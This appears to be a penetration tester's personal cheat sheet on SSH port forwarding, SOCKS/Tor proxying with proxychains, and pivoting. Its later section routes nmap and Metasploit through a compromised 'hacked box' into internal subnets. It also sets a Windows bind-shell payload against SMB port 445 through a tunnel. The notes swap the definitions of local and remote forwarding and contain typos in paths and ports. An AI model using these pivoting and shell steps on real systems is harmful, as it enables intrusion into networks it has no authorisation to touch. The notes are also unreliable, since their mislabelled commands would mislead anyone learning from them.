SSH Tunneling

[*] Remote Port Forwarding.
    Access a port that's blocked. 8181 for localhost. FTP 21 is closed so we redirect it to our 8181. Right over SSH.
        ssh -L 8181:<remote IPv4>:21 ssh <username>@<remote IPv4>

    Access a port that's blocked AND a machine we can't reach without proxy'ing through a remote machine. Works great accessing vlan's we have no access:
    Remote machine we want --> Remote Proxy Machine --> Localhost
       ssh -A -L 8080:127.0.0.1:8080 user@192.168.1.10 ssh -A -L 8080:127.0.0.1:8080 user@192.168.122.183 -N
       ssh -i ~/.ssh/id_rsa -L 8080:127.0.0.1:8080 user@192.168.1.10 ssh -i ~/.ssh/id_rsa -L 8080:127.0.0.1:8080 user@192.168.122.183 -N

[*] Local port forwarding
    OpenVAS listening on 9392, forward to 8181. Now remote machine is listening on localhost 8182. You can use GUI to localhost port 8181 to see OpenVAS.
        ssh -R 8181:127.0.0.1:9392 <username>@<remote IPv4>

[*] Dynamic Port Forwarding
    Create a dynamic tunnel to another machine.
    Update /etc/proxychains to allows socks5 127.0.0.1 9050
        ssh -D 8181 <username>@<remote IPv4>
    Socks proxy
        ssh -D 8181 <username>@<remote IPv4>
    Tor Proxy - begin all commands with "proxychains <command>"
        service tor start
        service tor status
        netstat -antp | grep 9050 #  Check for LISTEN
        vi /etc/procychains
            dynamic_chain
            socks5 127.0.0.1 9050



Lateral and Vertical Movement


[*] Tunnel traffic dynamically:
        ssh -D 8181 <username>@<remote IPv4>
    Now nmap - this will parse through a hacked machine that is dynamically set through your above proxy over ssh.
        proxychains nmap -sV -p<ports> <IPv4 on same LAN>

    Now let's run msfconsole (metasploit) through the proxy:
        proxychains msfconsole
            This will help with exploits locally through your proxied server.

[*] Create a Tunnel to the remote host to local machine:
        ssh -L 8181:<remote IPv4>:445 <username>@<remote IPv4>
    Open msfconsole then set RHOST to local
        msfconsole
        set RHOST 127.0.0.1
        set RPORT 8181
        set payload windows/shell/bind_tcp
        set RHOST <remote IPv4> #  Payload only
        set LPORT 8181
        run


[*] Pivoting
        Most examples are metasploit, lets define this first.
        Once a box is hacked, you may find internal networking.
        Think about routing your recon through the hacked box and into the internal network.
        Example:
                External IP is 192.168.1.90
                Internal network is 10.10.10.1/16
                Route a proxy through the hacked box via proxy server, ssh tunneling, meterpreter in metasploit, etc.
                Then run your nmaps, enumerations, etc through the proxy hacked box and into the internal subnet.
        ssh -D localhost:9000 -f -N pentester@external-host -p 22




